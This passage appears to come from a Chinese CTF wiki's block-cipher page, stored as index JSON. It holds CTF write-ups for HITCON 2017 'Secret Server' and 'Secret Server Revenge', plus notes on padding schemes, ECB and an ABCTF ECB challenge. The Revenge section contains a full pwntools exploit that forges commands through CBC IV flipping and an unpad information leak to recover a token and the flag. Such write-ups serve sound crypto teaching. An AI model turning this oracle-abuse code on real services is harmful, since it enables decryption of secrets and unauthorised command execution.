command payload = flipplain ( guess_md5 , 'get-time' . ljust ( 16 , ' \\x01 ' ), iv_encrypt ) payload += md5_indexi p . sendline ( base64 . b64encode ( payload )) res = p . recvuntil ( \" \\n \" , drop = True ) # if we receive the block for 'command not found', the hash was wrong if res == cipher_notfound : print 'Guess {} is wrong.' . format ( guess ) # otherwise we correctly guessed the hash and the command was executed else : print 'Found!' flag += chr ( guess ) print 'Flag so far:' , flag break if __name__ == \"__main__\" : main () \u6700\u540e\u7ed3\u679c\u5982\u4e0b Flag so far: Paddin9_15_ve3y_h4rd__!! } \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 \\x 10 2017 HITCON Secret Server Revenge \u00b6 \u63cf\u8ff0 \u00b6 The password of zip is the flag of \"Secret Server\" \u5206\u6790 \u00b6 \u8fd9\u4e2a\u7a0b\u5e8f\u65f6\u63a5\u7740\u4e0a\u9762\u7684\u7a0b\u5e8f\u7ee7\u7eed\u641e\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fdb\u884c\u7684\u7b80\u5355\u7684\u4fee\u6539 \u52a0\u5bc6\u7b97\u6cd5\u7684 iv \u672a\u77e5\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u6839\u636e Welcome \u52a0\u5bc6\u540e\u7684\u6d88\u606f\u63a8\u7b97\u51fa\u6765\u3002 \u7a0b\u5e8f\u591a\u4e86\u4e00\u4e2a 56 \u5b57\u8282\u7684 token\u3002 \u7a0b\u5e8f\u6700\u591a\u80fd\u8fdb\u884c 340 \u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c \u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b \u7ecf\u8fc7 proof of work \u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f \u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002 \u6f0f\u6d1e \u00b6 \u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373 \u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4 \u957f\u5ea6\u622a\u65ad \u5229\u7528\u601d\u8def \u00b6 \u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\uff08 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002 \u8fd9\u91cc md5(token[:i]) \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002 \u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f \u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\u3002 unpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002 \u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c encrypt(md5(token[:i])) \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210 C|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f md5(token[:i]) \u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec \u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c \uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a md5(token[:i]) \u7684 \u6700\u540e\u4e00\u4e2a\u5b57\u8282 \u3002\u7136\u800c\uff0c\u5982\u679c md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684 token[:i] \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002 \u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work\u3002 \u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c token_enc \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282 \"token: \" \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002 \u4f9d\u6b21\u83b7\u53d6 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002 \u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587 token_enc|padding|IV_indexi|welcome_enc \u3002\u7531\u4e8e IV_indexi \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56>340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002 \u518d\u6b21\u6784\u9020\u5bc6\u6587 token_enc|padding|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002 \u5728\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002 \u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a md5(token[:i]) \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002 \u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d sleep \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # remove pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) def sendmsg ( iv , cipher ): payload = iv + cipher payload = base64 . b64encode ( payload ) p . sendline ( payload ) def recvmsg (): data = p . recvuntil ( \" \\n \" , drop = True ) data = base64 . b64decode ( data ) return data [: 16 ], data [ 16 :] def getmd5enc ( i , cipher_token , cipher_welcome , iv ): \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\" ## keep iv[7:] do not change, so decrypt msg[7:] won't change get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv ) payload = cipher_token ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_token ) + 16 + 16 - ( 7 + i + 1 )), iv ) payload += last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , payload ) return recvmsg () def get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ): md5_token_idxi = [] for i in range ( len ( cipher_token ) - 7 ): log . info ( \"idx i: {}\" . format ( i )) _ , md5_indexi = getmd5enc ( i , cipher_token , cipher_welcome , iv_encrypt ) assert ( len ( md5_indexi ) == 32 ) # remove the last 16 byte for padding md5_token_idxi . append ( md5_indexi [: 16 ]) return md5_token_idxi def doin ( unpadcipher , md5map , candidates , flag ): if unpadcipher in md5map : lastbyte = md5map [ unpadcipher ] else : lastbyte = 0 if flag == 0 : lastbyte ^= 0x80 newcandidates = [] for x in candidates : for c in range ( 256 ): if MD5 . new ( x + chr ( c )) . digest ()[ - 1 ] == chr ( lastbyte ): newcandidates . append ( x + chr ( c )) candidates = newcandidates print candidates return candidates def main (): bypassproof () # result of encrypted Welcome!! iv_encrypt , cipher_welcome = recvmsg () log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-token get_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-token\" ), iv_encrypt ) sendmsg ( get_token_iv , cipher_welcome ) _ , cipher_token = recvmsg () token_len = len ( cipher_token ) log . info ( \"cipher token is : \" + cipher_token ) # get command not found cipher sendmsg ( iv_encrypt , cipher_welcome ) _ , cipher_notfound = recvmsg () # get encrypted(token[:i+1]),57 times md5_token_idx_list = get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ) # get md5map for each unpadsize, 209-17 times # when upadsize>208, it will unpad ciphertoken # then we can reuse md5map = dict () for unpadsize in range ( 17 , 209 ): log . info ( \"get unpad size {} cipher\" . format ( unpadsize )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" ## calculate the proper last byte number, only change the last byte ## set last_byte_iv = iv_encrypted[:15] | proper byte last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"Welcome!!\" )[: 15 ] + chr ( unpadsize ), iv_encrypt ) cipher = cipher_token + padding + last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () md5map [ unpadcipher ] = unpadsize # reuse encrypted(token[:i+1]) for i in range ( 209 , 256 ): target = md5_token_idx_list [ 56 - ( i - 209 )] md5map [ target ] = i candidates = [ \"\" ] # get the byte token[i], only 56 byte for i in range ( token_len - 7 ): log . info ( \"get token[{}]\" . format ( i )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list [ i ] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () # already in or md5[token[:i]][-1]='\\x00' if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 1 ) else : log . info ( \"unpad size 1-16\" ) # flip most significant bit of last byte to move it in a good range cipher = cipher [: - 17 ] + strxor ( cipher [ - 17 ], ' \\x80 ' ) + cipher [ - 16 :] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 0 ) else : log . info ( 'oh my god,,,, it must be in...' ) exit () print len ( candidates ) # padding 0x01 candidates = filter ( lambda x : x [ - 1 ] == chr ( 0x01 ), candidates ) # only 56 bytes candidates = [ x [: - 1 ] for x in candidates ] print len ( candidates ) assert ( len ( candidates [ 0 ]) == 56 ) # check-token check_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"check-token\" ), iv_encrypt ) sendmsg ( check_token_iv , cipher_welcome ) p . recvuntil ( \"Give me the token! \\n \" ) p . sendline ( base64 . b64encode ( candidates [ 0 ])) print p . recv () p . interactive () if __name__ == \"__main__\" : main () \u6548\u679c\u5982\u4e0b ... 79 1 hitcon { uNp@d_M3th0D_i5_am4Z1n9! } \u53c2\u8003\u8d44\u6599 \u00b6 \u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f https://en.wikipedia.org/wiki/Padding_oracle_attack http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf https://ctftime.org/writeup/7975 https://ctftime.org/writeup/7974 \u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b","title":"\u5206\u7ec4\u6a21\u5f0f"},{"location":"crypto/blockcipher/block-cipher-mode/#_1","text":"\u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002","title":"\u5206\u7ec4\u6a21\u5f0f"},{"location":"crypto/blockcipher/block-cipher-mode/#_2","text":"\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002 \u5e38\u89c1\u7684 \u586b\u5145\u89c4\u5219 \u5982\u4e0b\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002","title":"\u586b\u5145\u89c4\u5219"},{"location":"crypto/blockcipher/block-cipher-mode/#pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 05 05 05 05 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40","title":"Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)"},{"location":"crypto/blockcipher/block-cipher-mode/#pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 80 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 \u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002","title":"Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)"},{"location":"crypto/blockcipher/block-cipher-mode/#pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8","title":"Pad with zeroes except make the last byte equal to the number of padding bytes"},{"location":"crypto/blockcipher/block-cipher-mode/#pad-with-zero-null-characters","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 00 00 00 00 00 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75","title":"Pad with zero (null) characters"},{"location":"crypto/blockcipher/block-cipher-mode/#pad-with-spaces","text":"\u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6f 72 20 20 20 20 20 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25","title":"Pad with spaces"},{"location":"crypto/blockcipher/block-cipher-mode/#ecb","text":"ECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002","title":"ECB"},{"location":"crypto/blockcipher/block-cipher-mode/#_3","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_4","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/block-cipher-mode/#_5","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_6","text":"\u5b9e\u73b0\u7b80\u5355\u3002 \u4e0d\u540c\u660e\u6587\u5206\u7ec4\u7684\u52a0\u5bc6\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\uff0c\u901f\u5ea6\u5f88\u5feb\u3002","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_7","text":"\u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\uff0c\u4e0d\u4f1a\u9690\u85cf\u660e\u6587\u5206\u7ec4\u7684\u7edf\u8ba1\u89c4\u5f8b\u3002\u6b63\u5982\u4e0b\u56fe\u6240\u793a \u4e3a\u4e86\u89e3\u51b3\u7edf\u4e00\u660e\u6587\u4ea7\u751f\u76f8\u540c\u5bc6\u6587\u7684\u95ee\u9898\uff0c\u63d0\u51fa\u4e86\u5176\u5b83\u7684\u52a0\u5bc6\u6a21\u5f0f\u3002","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/block-cipher-mode/#_8","text":"\u7528\u4e8e\u968f\u673a\u6570\u7684\u52a0\u5bc6\u4fdd\u62a4\u3002 \u7528\u4e8e\u5355\u5206\u7ec4\u660e\u6587\u7684\u52a0\u5bc6\u3002","title":"\u5178\u578b\u5e94\u7528"},{"location":"crypto/blockcipher/block-cipher-mode/#2016-abctf-aes-mess-75","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this? [HINT] There has to be some way to work backwards, right? \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u662f\u4e00\u4e2a ECB \u52a0\u5bc6\uff0c\u7136\u540e AES \u662f 16 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528\u4e24\u4e2a 16 \u8fdb\u5236\u5b57\u7b26\u8868\u793a\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u6bcf 32 \u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u5206\u7ec4\uff0c\u7136\u540e\u53bb\u5bf9\u5e94\u7684 txt \u6587\u4ef6\u4e2d\u641c\u7d22\u5373\u53ef\u3002 \u5bf9\u5e94 flag e220eb994c8fc16388dbd60a969d4953 abctf{looks_like f042fc0bce25dbef573cf522636a1ba3 _you_can_break_a fafa1a7c21ff824a5824c5dc4a376e75 es} 